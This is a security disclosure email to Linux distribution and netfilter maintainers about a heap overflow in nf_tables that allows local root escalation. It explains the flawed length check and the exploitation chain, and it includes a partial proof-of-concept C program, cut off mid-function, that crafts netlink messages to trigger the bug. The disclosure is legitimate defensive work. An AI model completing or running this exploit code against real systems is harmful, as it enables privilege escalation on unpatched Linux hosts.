Return-Path: <netfilter-devel-owner@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 375D0CCA479
	for <netfilter-devel@archiver.kernel.org>; Fri,  1 Jul 2022 15:43:26 +0000 (UTC)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S229810AbiGAPnZ (ORCPT
        <rfc822;netfilter-devel@archiver.kernel.org>);
        Fri, 1 Jul 2022 11:43:25 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:40080 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S230426AbiGAPnY (ORCPT
        <rfc822;netfilter-devel@vger.kernel.org>);
        Fri, 1 Jul 2022 11:43:24 -0400
Received: from FRA01-MR2-obe.outbound.protection.outlook.com (mail-eopbgr90070.outbound.protection.outlook.com [40.107.9.70])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 28C9110558
        for <netfilter-devel@vger.kernel.org>; Fri,  1 Jul 2022 08:43:21 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=K+9HHsc7E+NMLNzRa8Bx4GFE3dZeLNPYO2qRLCKqsLaXOuzlsl15KiQJ5ic7WTQSxfxPkl0TletKW775QBr7HzuXbb9PS3Es3jXsHPlPf0MiNvkgiUxdhRzlGoZTgXPR4cbbE5EigZUczaPYjgFkQBY+yHSkLtt5GKGk8kmgI1oFHtu5nTdwpdYD5vXgn++8Ki5yMRSt6NV9yczPSh2OTf39pK9TqBjO3zAFtOuT/kbknOig1ex0hMVf0aKvSJocuyCBl5YH9x+tfjN95ohbiPvjqU/4pAfG+HMs4+CW2cUeaUrWDDPp6Rljn5HgG8r6i0GRre9rypXBpdknZoQnbQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=E69ebiFOwWSutGd7Pw1borOaMH6Nf9S+bmLRfE3s0Nw=;
 b=itWAMR3wZ4Q+zAT700eJaCk4qb+O5hCatgXilmo1cUSIASS5mEErqWzHMGGMScfyVH3GX5GT/vXqgrarFMaEMgu5yX3haD3uKBlVGJXMy2WQUBhpWOp1zY1+Lg3flJnXHxFJjf/4tDIA4CWlixrQImd4Ough2a0k/OhrbL5zjRYHelQhdsC44RL6AHg7DCfOkdparMoNbrlErNbW2Bj1ON/cA/OLXsr1ZtmQD4EPVq2cM1uLMp3D6u4ut3lHA1jrzRiyebXpvYcKkc0neyQSRxw1gCLM492s2v3pjYsoGzaRqXRTjXthrRXR2oVVBO+TXJHw+Kh7hIvIXxyr6QUAWw==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=randorisec.fr; dmarc=pass action=none
 header.from=randorisec.fr; dkim=pass header.d=randorisec.fr; arc=none
Authentication-Results: dkim=none (message not signed)
 header.d=none;dmarc=none action=none header.from=randorisec.fr;
Received: from MR1P264MB4211.FRAP264.PROD.OUTLOOK.COM (2603:10a6:501:25::15)
 by PR1P264MB4197.FRAP264.PROD.OUTLOOK.COM (2603:10a6:102:254::10) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.5373.18; Fri, 1 Jul
 2022 15:43:17 +0000
Received: from MR1P264MB4211.FRAP264.PROD.OUTLOOK.COM
 ([fe80::b0f9:b415:c28:9138]) by MR1P264MB4211.FRAP264.PROD.OUTLOOK.COM
 ([fe80::b0f9:b415:c28:9138%3]) with mapi id 15.20.5395.015; Fri, 1 Jul 2022
 15:43:17 +0000
Message-ID: <cd9428b6-7ffb-dd22-d949-d86f4869f452@randorisec.fr>
Date:   Fri, 1 Jul 2022 17:43:16 +0200
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
 Thunderbird/91.10.0
Content-Language: en-US
To:     linux-distros@vs.openwall.org
Cc:     security@kernel.org, pablo@netfilter.org, kadlec@netfilter.org,
        fw@strlen.de, netfilter-devel@vger.kernel.org,
        coreteam@netfilter.org, davy <davy@randorisec.fr>,
        amongodin@randorisec.fr
From:   Hugues ANGUELKOV <hanguelkov@randorisec.fr>
Subject: [vs] Netfilter vulnerability disclosure
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit
X-ClientProxiedBy: PR0P264CA0092.FRAP264.PROD.OUTLOOK.COM
 (2603:10a6:100:18::32) To MR1P264MB4211.FRAP264.PROD.OUTLOOK.COM
 (2603:10a6:501:25::15)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-Office365-Filtering-Correlation-Id: 92820a19-509e-4940-7554-08da5b786b07
X-MS-TrafficTypeDiagnostic: PR1P264MB4197:EE_
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: dqUqcsTRJgXZ8zgGLfPsv16eqwaFw3G7gMwQraKjCqZ0hTJUSXCrGEDDnSdFfFMmlJbP9ajabZEcDHaTb5+FmP75ClzxHID8AioTa8afkdoSZWJDXiLy51tm00id5UvQ0RYJn9wWxH2rhTpmJv+rQU/6fxv2lApEIAuml5yY9HVKH4grnlBQ2pbo7MFQ2QBIo11dsfEkydGtKEjZiqT5dEtPDU9/aPeBllb/tL4vEGk2Y+YbBbcbE5QA4gbwfWHvcgnC0YjJG7ZusHExCciNp+69OPw7I/gKnZgNpXd90SJTYZrFMkaTNmDPKrFthRxunXDyF7fn9LnDET8orofeEpDACbrr5+N4YrgdSMIU8pyNUKZ6PNKHHHA0ALcDAvMQIixOu4nTDw6nvj7d+c6ZLvaOg7entpvsNVlpFIFIyD3RGEpOaGp1KPLNmMZbTPszkHEvg4MkFuCGvIj3/RyUyXidRaq5EqDUnsKdRfzrlAzo+Vrp4viIG4Pw/dBLrTgSZ5S4edgwf0ALT9eblBVLHGSePmk1mskbEoYUKZoNZqNv/r8ku4jRMiWUUqVwWZsPNPYcRgag33hb13ezgacWAamEDw0xYH+h8zt3pzBn737gz84hPfbIqHISLGcLyacwM8LFJUoOrvp2hLngkkyG5iobmQqlYnmjpxFk4F91R1K+M3lnM51Gws7GOgWFvYvxlo9aBtrNV1AgdgdViCRDJOubvr9S1G0B6ImMTThKB7LpOP3xwAY7NyMg0Q5Vd9gQb2KNAlB6JaHb3GDZt61jt02mPYEneZmGAgPxhlcqdNoY9M27HsZ+Jrt/Tcv6NwdicrdkUmUmQfYyJncv4PV2fGO6eO+oJLHQGQtj/q3yMV2BZd+dbWeMc4U1G/yvyXbd
X-Forefront-Antispam-Report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:MR1P264MB4211.FRAP264.PROD.OUTLOOK.COM;PTR:;CAT:NONE;SFS:(13230016)(136003)(346002)(366004)(39830400003)(396003)(376002)(316002)(2906002)(4326008)(5660300002)(8936002)(86362001)(30864003)(36756003)(83380400001)(31686004)(6916009)(66946007)(186003)(107886003)(38100700002)(8676002)(2616005)(478600001)(41300700001)(66476007)(6506007)(31696002)(66556008)(6486002)(6512007)(45980500001)(43740500002);DIR:OUT;SFP:1101;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: =?utf-8?B?VVl5WVVXaU9GRnhFYTdVd3N2RWsrdnkydHBJcUVCc3ViSlY0VGY3c010MkZj?=
 =?utf-8?B?cmUzdjZvZG1EVEcwOTVxVnYxT2FUV21DTHczRHUxSTVBYjNKdy85ankzcU80?=
 =?utf-8?B?NGdZa3A0ZTE2OThaemE5cTdBQWtIRjNCSHBvQW42SCt1em5NRHgrSnpjY1lk?=
 =?utf-8?B?QXZyUWRSalB2a3FRY3Z3TTlBZUtmUUkrRk9vdThHUE02L3dTeTUyT1FvQXVG?=
 =?utf-8?B?endqYm5VcDdvYlBoYXBPYWJONUpRblovaklsdGgwYXF2OFlQQ2xFZjlubWk1?=
 =?utf-8?B?R2grZ0hQT2llTkNHNFRKT2ZsRjgvUFlmUHVjam54VVlFbVVQVTYwaXFjWGpE?=
 =?utf-8?B?dFJDQmJQMnpsQ00wM1VYVlpCeHRXS0hhRTVyZkpLN0xQK1dCU2ZLM1pkNWtZ?=
 =?utf-8?B?NjRvbnhPQVNrSGlSakNxa1BkWm1Rb2VwZUg2V1FVaFFkSlJjaFpUaThvRzVq?=
 =?utf-8?B?VGdhcTFuU21nUy9sNVp4dEx1Ulh1Y0xXUVZBYldkdk16L2RpTXZMdllUMXl4?=
 =?utf-8?B?dFBWYWwyNTVwYWJqYUhyeDFjb0RaQnl1eWdXdG5wUUtpZFRmOGVvSkc1REk4?=
 =?utf-8?B?OC8reWQ4Yy9XTmgxWHdKSGh3QkdZSkh0bjUvcVZKWFc4eFE0THVSbVd0RTNX?=
 =?utf-8?B?YVFFOE9aYXpmU2tvR3J0UE91Mk1HR0lkT0tVNkdPUjVyNkVFNzUzR2ZlTmQ2?=
 =?utf-8?B?S1V2cTc4WUZWTW1oOEwvL28vNXk0eEVtKzZwL1FlVEdZYTQ1NmRNRTltU3hL?=
 =?utf-8?B?SGF5VjBHbzVuMWpmakF6WGNJZmQ4eDhkblBHN21ZdU9uK2hUU1gwRVMrb2xj?=
 =?utf-8?B?cGdHYWQ1MDdNclhXR0kvUVNFY3VIQUZaWmkzeER6R1FvNHQyWXRIVXBlcVYv?=
 =?utf-8?B?V2FnWnMyQlEvM1poaDNBUmZrSThwNTZDVEIxWlg2QU1IK0kwcGdqMmR5MGYv?=
 =?utf-8?B?b0VTOXhTOGRyckQwdksyVis1R1loS2QrS0RlUy82N0pqcW1WWUpPNGNzQXRr?=
 =?utf-8?B?YmRWRjNDNWZSVTFXeDRQcmtlYzhKOFRWNlg2MHB2L01XalRpbWhGQUdJU1lj?=
 =?utf-8?B?UjY3OFo0dUloVFFPQTdYRXVUY3pCTDZGTVErUFJON3ZWK0xlT3M5R2RzRlph?=
 =?utf-8?B?T25TWSttRmN5QVdQbG90ZXBRZnRubTdNbUJoM0VTYk5LUzhwcERDSk1sT1pP?=
 =?utf-8?B?VnFmMjhVUmJIVXlEQXRLRW1JT2pzQ3dCOGpHTTRhckR3cm55SGhFam82eFlx?=
 =?utf-8?B?ZTZCUmhVcTcyR1l2Vm5lSXNBVWM4T1A3QVZ3V25xMDh2RWZEQ1NEMSt6ZmZL?=
 =?utf-8?B?Q1RsTGplTGNhRzkxSlNhQnJhZElKV0Z4SEMwbDd1dW9DRUNSQThueE50NGpl?=
 =?utf-8?B?M1pnTHJUVkdTWnhyOC9BdTN0aUcxbVhQTmtlTmlaODVkcm1ET2xqM0FNZmhs?=
 =?utf-8?B?cGtvN1hsK0RGc0ZnY0doc3FOK0dtOXZvSm1KMG82Qit2M1J6SnU2Y1AxRFB6?=
 =?utf-8?B?aEhkWEdpQS94SlNBSG5oakc1VStQNlVvV2lsa1hrbWlPMGpUNWdSNHVIMUJD?=
 =?utf-8?B?SGNYYXBHYVRPbFpHOTBsUDlVSHV1ak4wdzhwWERPTTRwQ2pwN3BwaFNCcTEx?=
 =?utf-8?B?cFFDbk0zV1VubmlJRnhING5XaXVOYVN4dWNYOFhBTkVmRG50REk4bmhiRU5k?=
 =?utf-8?B?RDNKeTc0bjI0bTdCK0p5NjBKWCtvMVVNWktVUVdRQ1dsakFLc0dIOG1oTXdG?=
 =?utf-8?B?eHdsSmJLRlhoQlJuV2xjY0dhY1oyQ1FySWYyWWJsZklGc0xETlJINEN4cG1s?=
 =?utf-8?B?MVFGWUdsVnZFam9hTnUxM0FSVS9xL3pYUU1NRDlnUXRRM3dNMVJVWkRoZjRi?=
 =?utf-8?B?RjB3UFpZZjNKUWFQK3JMQ3BrZWNiL0dpMHYwZHpjb3FDZTdhdDNXR0h2YmdY?=
 =?utf-8?B?TllJNnk0SEpOUFpmbktRdkU3d2NLYmhoTWpuRXVjT1dzbnA3TUQ4aHZLNGx4?=
 =?utf-8?B?OE1YN0lSWm0wNmI5d2dVRklwS0x0OTBJeHFrUjBvS09pVktRMFZhVmUxVXdk?=
 =?utf-8?B?bmFNTWdCTVYvbVppeE5OT2tmcGZBamt1QnhobTBRQUpuTUhHWk9Qa0w5czgv?=
 =?utf-8?B?Z0o5YnJrVHJnbjJzb3N0SnZYZUs2VGlIOHZmNksyY1grMVI1VFl1S3B0UGJr?=
 =?utf-8?B?Vnh5M2hsNjNqbTdTVXFEOXpjdnUza2RjeVZQRjBpTnpZenQxU3NiTDhOZnBG?=
 =?utf-8?B?NFpBdGJlRFpTWFlReG14TzBobXRBPT0=?=
X-OriginatorOrg: randorisec.fr
X-MS-Exchange-CrossTenant-Network-Message-Id: 92820a19-509e-4940-7554-08da5b786b07
X-MS-Exchange-CrossTenant-AuthSource: MR1P264MB4211.FRAP264.PROD.OUTLOOK.COM
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 01 Jul 2022 15:43:17.7137
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: c1031ca0-4b69-4e1b-9ecb-9b3dcf99bc61
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: gMSLIxFVkCM4hb5kJLLMIe5j3MSDAS+w7rxp3uA6m7SoVO3Qsz2LMWr2y6OFAKxk9tcNynEbXyw+zNOgViXTNdDxDB9k0HgwVtPTqiUmBL4=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: PR1P264MB4197
Precedence: bulk
List-ID: <netfilter-devel.vger.kernel.org>
X-Mailing-List: netfilter-devel@vger.kernel.org

Hello everyone,

One of our collaborators at RandoriSec, Arthur Mongodin found a 
vulnerability within the netfilter subsystem during his internship.
Successful exploitation of this bug leads to a Local Privilege 
Escalation (LPE) to the `root` user, as tested on Ubuntu server 22.04 
(Linux 5.15.0-39-generic).
This vulnerability is a heap buffer overflow due to a weak check and has 
been introduced within the commit 
[fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81](https://github.com/torvalds/linux/commit/fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81), 
it affects the Linux kernel since the version 5.8 and is still present 
today.

The heap buffer overflow happens in the function `nft_set_elem_init` 
(`/net/netfilter/nf_tables_api.c`)

```c
void *nft_set_elem_init(const struct nft_set *set,
             const struct nft_set_ext_tmpl *tmpl,
             const u32 *key, const u32 *key_end,
             const u32 *data, u64 timeout, u64 expiration, gfp_t gfp)
{
     struct nft_set_ext *ext;
     void *elem;

     elem = kzalloc(set->ops->elemsize + tmpl->len, 
gfp);                    <===== (0)
     if (elem == NULL)
         return NULL;

     ...

     if (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))
         memcpy(nft_set_ext_data(ext), data, 
set->dlen);                     <===== (1)

     ...

     return elem;
}
```

A buffer is allocated at (0) without taking in consideration the value 
`set->dlen` used at (1) for the copy.
The computation of the needed space (`tmpl->len`) is realized before the 
call to `nft_set_elem_init`, however,
  a weak check on a user input allows a user to provide an element with 
a data length lower than the `set->dlen` for the allocation.
This check is located within the function `nft_set_elem_parse_data` 
(`/net/netfilter/nf_tables_api.c`).

```c
static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
                   struct nft_data_desc *desc,
                   struct nft_data *data,
                   struct nlattr *attr)
{

     ...

     if (desc->type != NFT_DATA_VERDICT && desc->len != set->dlen) 
{         <===== (2)
         nft_data_release(data, desc->type);
         return -EINVAL;
     }

     return 0;
}
```

As we can see at (2), if the data type is `NFT_DATA_VERDICT`, the 
comparison between `desc->len` and `set->dlen` is not done.
Finally, `desc->len` it is used to compute `tmpl->len` at (0) and 
`set->dlen` for the copy at (1) and they can be different.

The vulnerable code path can be reached if the kernel is built with the 
configuration `CONFIG_NETFILTER`, `CONFIG_NF_TABLES` enabled.
To exploit the vulnerability, an attacker may need to obtain an 
unprivileged user namespace to gain the capability `CAP_NET_ADMIN` 
(`CONFIG_USER_NS` and `CONFIG_NET_NS` enabled, and 
`kernel.unprivileged_userns_clone = 1`).


The exploitation was simplified by the use of an uninitialized variable 
in `nft_add_set_elem`:

```c
static int nft_add_set_elem(struct nft_ctx *ctx, struct nft_set *set, 
const struct nlattr *attr, u32 nlmsg_flags)
{
   struct nft_set_elem elem;
   ...
}
```

First we add an `elem` with the type `NFT_DATA_VALUE`, then `elem.data` 
will be filled `set->dlen` bytes, the second iteration will only erase 
the first bytes of `elem.data` with an element of type `NFT_DATA_VERDICT`.

We get an infoleak by overwriting the field `datalen` of 
an`user_key_payload` structure. The write primitive can be obtained with 
an unlinking attack on the `list_head` of the `simple_xattr` structure.
We targeted the `modprobe_path` to gain root permission by executing a 
shell wrapper.

The following Proof of Concept (PoC) will trigger KASAN on the upstream 
kernel (Linux 5.19.0-rc4)

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <arpa/inet.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

#define do_error_exit(msg) do {perror("[-] " msg); exit(EXIT_FAILURE); } 
while(0)

#define ID 1337
#define SET_NAME "name\0\0\0"
#define LEAK_SET_NAME "leak\0\0\0"
#define TABLE "table\0\0"

#define U32_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint32_t))
#define U64_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint64_t))
#define S8_NLA_SIZE (sizeof(struct nlattr) + 8)
#define NLA_BIN_SIZE(x) (sizeof(struct nlattr) + x)
#define NLA_ATTR(attr) ((void *)attr + NLA_HDRLEN)

#define TABLEMSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) + 
sizeof(struct nlattr) + 8)

#define KMALLOC64_KEYLEN (64 - 8 - 12 - 16) // Max size - elemsize - 
sizeof(nft_set_ext)(align) - min datasize

#define BUFFER_SIZE 64

uint8_t buffer[BUFFER_SIZE] = {0};

void new_ns(void) {

     if (unshare(CLONE_NEWUSER))
         do_error_exit("unshare(CLONE_NEWUSER)");

     if (unshare(CLONE_NEWNET))
         do_error_exit("unshare(CLONE_NEWNET)");
}

struct nlmsghdr *get_batch_begin_nlmsg(void) {

     struct nlmsghdr *nlh = (struct nlmsghdr 
*)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
     struct nfgenmsg *nfgm = (struct nfgenmsg *)NLMSG_DATA(nlh);

     if (!nlh)
         do_error_exit("malloc");

     memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
     nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
     nlh->nlmsg_type = NFNL_MSG_BATCH_BEGIN;
     nlh->nlmsg_pid = getpid();
     nlh->nlmsg_flags = 0;
     nlh->nlmsg_seq = 0;

     /* Used to access to the netfilter tables subsystem */
     nfgm->res_id = NFNL_SUBSYS_NFTABLES;

     return nlh;
}

struct nlmsghdr *get_batch_end_nlmsg(void) {

     struct nlmsghdr *nlh = (struct nlmsghdr 
*)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));

     if (!nlh)
         do_error_exit("malloc");

     memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
     nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
     nlh->nlmsg_type = NFNL_MSG_BATCH_END;
     nlh->nlmsg_pid = getpid();
     nlh->nlmsg_flags = NLM_F_REQUEST;
     nlh->nlmsg_seq = 0;

     return nlh;
}

struct nlattr *set_nested_attr(struct nlattr *attr, uint16_t type, 
uint16_t data_len) {
     attr->nla_type = type;
     attr->nla_len = NLA_ALIGN(data_len + sizeof(struct nlattr));
     return (void *)attr + sizeof(struct nlattr);
}

struct nlattr *set_u32_attr(struct nlattr *attr, uint16_t type, uint32_t 
value) {
     attr->nla_type = type;
     attr->nla_len = U32_NLA_SIZE;
     *(uint32_t *)NLA_ATTR(attr) = htonl(value);

     return (void *)attr + U32_NLA_SIZE;
}

struct nlattr *set_str8_attr(struct nlattr *attr, uint16_t type, const 
char name[8]) {
     attr->nla_type = type;
     attr->nla_len = S8_NLA_SIZE;
     memcpy(NLA_ATTR(attr), name, 8);

     return (void *)attr + S8_NLA_SIZE;
}

struct nlattr *set_binary_attr(struct nlattr *attr, uint16_t type, 
uint8_t *buffer, uint64_t buffer_size) {
     attr->nla_type = type;
     attr->nla_len = NLA_BIN_SIZE(buffer_size);
     memcpy(NLA_ATTR(attr), buffer, buffer_size);

     return (void *)attr + NLA_ALIGN(NLA_BIN_SIZE(buffer_size));
}
void create_table(int sock, const char *name) {
     struct msghdr msg;
     struct sockaddr_nl dest_snl;
     struct iovec iov[3];
     struct nlmsghdr *nlh_batch_begin;
     struct nlmsghdr *nlh;
     struct nlmsghdr *nlh_batch_end;
     struct nlattr *attr;
     struct nfgenmsg *nfm;

     /* Destination preparation */
     memset(&dest_snl, 0, sizeof(dest_snl));
     dest_snl.nl_family = AF_NETLINK;
     memset(&msg, 0, sizeof(msg));

     /* Netlink batch_begin message preparation */
     nlh_batch_begin = get_batch_begin_nlmsg();

     /* Netlink table message preparation */
     nlh = (struct nlmsghdr *)malloc(TABLEMSG_SIZE);
     if (!nlh)
         do_error_exit("malloc");

     memset(nlh, 0, TABLEMSG_SIZE);
     nlh->nlmsg_len = TABLEMSG_SIZE;
     nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;
     nlh->nlmsg_pid = getpid();
     nlh->nlmsg_flags = NLM_F_REQUEST;
     nlh->nlmsg_seq = 0;

     nfm = NLMSG_DATA(nlh);
     nfm->nfgen_family = NFPROTO_INET;

     /** Prepare associated attribute **/
     attr = (void *)nlh + NLMSG_SPACE(sizeof(struct nfgenmsg));
     set_str8_attr(attr, NFTA_TABLE_NAME, name);

     /* Netlink batch_end message preparation */
     nlh_batch_end = get_batch_end_nlmsg();

     /* IOV preparation */
     memset(iov, 0, sizeof(struct iovec) * 3);
     iov[0].iov_base = (void *)nlh_batch_begin;
     iov[0].iov_len = nlh_batch_begin->nlmsg_len;
     iov[1].iov_base = (void *)nlh;
     iov[1].iov_len = nlh->nlmsg_len;
     iov[2].iov_base = (void *)nlh_batch_end;
     iov[2].iov_len = nlh_batch_end->nlmsg_len;

     /* Message header preparation */
     msg.msg_name = (void *)&dest_snl;
     msg.msg_namelen = sizeof(struct sockaddr_nl);
     msg.msg_iov = iov;
     msg.msg_iovlen = 3;

     sendmsg(sock, &msg, 0);

     /* Free used structures */
     free(nlh_batch_end);
     free(nlh);
     free(nlh_batch_begin);
}

void create_set(int sock, const char *set_name, uint32_t set_keylen, 
uint32_t data_len, const char *table_name, uint32_t id) {
     struct msghdr msg;
     struct sockaddr_nl dest_snl;
     struct nlmsghdr *nlh_batch_begin;
     struct nlmsghdr *nlh_payload;
     struct nlmsghdr *nlh_batch_end;
     struct nfgenmsg *nfm;
     struct nlattr *attr;
     uint64_t nlh_payload_size;
     struct iovec iov[3];

     /* Prepare the netlink sockaddr for msg */
     memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
     dest_snl.nl_family = AF_NETLINK;

     /* First netlink message: batch_begin */
     nlh_batch_begin = get_batch_begin_nlmsg();

     /* Second netlink message : Set attributes */
     nlh_payload_size = sizeof(struct 
nfgenmsg);                                     // Mandatory
     nlh_payload_size += 
S8_NLA_SIZE;                                                // 
NFTA_SET_TABLE
     nlh_payload_size += 
S8_NLA_SIZE;                                                // NFTA_SET_NAME
     nlh_payload_size += 
U32_NLA_SIZE;                                               // NFTA_SET_ID
     nlh_payload_size += 
U32_NLA_SIZE;                                               // 
NFTA_SET_KEY_LEN
     nlh_payload_size += 
U32_NLA_SIZE;                                               // 
NFTA_SET_FLAGS
     nlh_payload_size += 
U32_NLA_SIZE;                                               // 
NFTA_SET_DATA_TYPE
     nlh_payload_size += 
U32_NLA_SIZE;                                               // 
NFTA_SET_DATA_LEN
     nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

     /** Allocation **/
     nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
     if (!nlh_payload)
         do_error_exit("malloc");

     memset(nlh_payload, 0, nlh_payload_size);

     /** Fill the required fields **/
     nlh_payload->nlmsg_len = nlh_payload_size;
     nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;
     nlh_payload->nlmsg_pid = getpid();
     nlh_payload->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
     nlh_payload->nlmsg_seq = 0;


     /** Setup the nfgenmsg **/
     nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
     nfm->nfgen_family = 
NFPROTO_INET;                                               // Verify if 
it is compulsory

     /** Setup the attributes */
     attr = (struct nlattr *)((void *)nlh_payload + 
NLMSG_SPACE(sizeof(struct nfgenmsg)));
     attr = set_str8_attr(attr, NFTA_SET_TABLE, table_name);
     attr = set_str8_attr(attr, NFTA_SET_NAME, set_name);
     attr = set_u32_attr(attr, NFTA_SET_ID, id);
     attr = set_u32_attr(attr, NFTA_SET_KEY_LEN, set_keylen);
     attr = set_u32_attr(attr, NFTA_SET_FLAGS, NFT_SET_MAP);
     attr = set_u32_attr(attr, NFTA_SET_DATA_TYPE, 0);
     set_u32_attr(attr, NFTA_SET_DATA_LEN, data_len);

     /* Last netlink message: batch_end */
     nlh_batch_end = get_batch_end_nlmsg();

     /* Setup the iovec */
     memset(iov, 0, sizeof(struct iovec) * 3);
     iov[0].iov_base = (void *)nlh_batch_begin;
     iov[0].iov_len = nlh_batch_begin->nlmsg_len;
     iov[1].iov_base = (void *)nlh_payload;
     iov[1].iov_len = nlh_payload->nlmsg_len;
     iov[2].iov_base = (void *)nlh_batch_end;
     iov[2].iov_len = nlh_batch_end->nlmsg_len;

     /* Prepare the message to send */
     memset(&msg, 0, sizeof(struct msghdr));
     msg.msg_name = (void *)&dest_snl;
     msg.msg_namelen = sizeof(struct sockaddr_nl);
     msg.msg_iov = iov;
     msg.msg_iovlen = 3;

     /* Send message */
     sendmsg(sock, &msg, 0);

     /* Free allocated memory */
     free(nlh_batch_end);
     free(nlh_payload);
     free(nlh_batch_begin);
}

void add_elem_to_set(int sock, const char *set_name, uint32_t 
set_keylen, const char *table_name, uint32_t id, uint32_t data_len, 
uint8_t *data) {
     struct msghdr msg;
     struct sockaddr_nl dest_snl;
     struct nlmsghdr *nlh_batch_begin;
     struct nlmsghdr *nlh_payload;
     struct nlmsghdr *nlh_batch_end;
     struct nfgenmsg *nfm;
     struct nlattr *attr;
     uint64_t nlh_payload_size;
     uint64_t nested_attr_size;
     struct iovec iov[3];

     /* Prepare the netlink sockaddr for msg */
     memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
     dest_snl.nl_family = AF_NETLINK;

     /* First netlink message: batch */
     nlh_batch_begin = get_batch_begin_nlmsg();

     /* Second netlink message : Set attributes */

     /** Precompute the size of the nested field **/
     nested_attr_size = 0;

     nested_attr_size += sizeof(struct 
nlattr);                                      // Englobing attribute
     nested_attr_size += sizeof(struct 
nlattr);                                      // NFTA_SET_ELEM_KEY
     nested_attr_size += 
NLA_BIN_SIZE(set_keylen);                                      // 
NFTA_DATA_VALUE
     nested_attr_size += sizeof(struct 
nlattr);                                      // NFTA_SET_ELEM_DATA
     nested_attr_size += sizeof(struct 
nlattr);                                      // NFTA_DATA_VERDICT
     nested_attr_size += 
U32_NLA_SIZE;                                               // 
NFTA_VERDICT_CODE

     nlh_payload_size = sizeof(struct 
nfgenmsg);                                     // Mandatory
     nlh_payload_size += sizeof(struct 
nlattr);                                      // NFTA_SET_ELEM_LIST_ELEMENTS
     nlh_payload_size += 
nested_attr_size;                                           // All the 
stuff described above
     nlh_payload_size += 
S8_NLA_SIZE;                                                // 
NFTA_SET_ELEM_LIST_TABLE
     nlh_payload_size += 
S8_NLA_SIZE;                                                // 
NFTA_SET_ELEM_LIST_SET
     nlh_payload_size += 
U32_NLA_SIZE;                                               // 
NFTA_SET_ELEM_LIST_SET_ID
     nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

     /** Allocation **/
     nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
     if (!nlh_payload) {
         do_error_exit("malloc");
     }
     memset(nlh_payload, 0, nlh_payload_size);

     /** Fill the required fields **/
     nlh_payload->nlmsg_len = nlh_payload_size;
     nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | 
NFT_MSG_NEWSETELEM;
     nlh_payload->nlmsg_pid = getpid();
     nlh_payload->nlmsg_flags = NLM_F_REQUEST;
     nlh_payload->nlmsg_seq = 0;

     /** Setup the nfgenmsg **/
     nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
     nfm->nfgen_family = NFPROTO_INET;

     /** Setup the attributes */
     attr = (struct nlattr *)((void *)nlh_payload + 
NLMSG_SPACE(sizeof(struct nfgenmsg)));
     attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_TABLE, table_name);
     attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_SET, set_name);
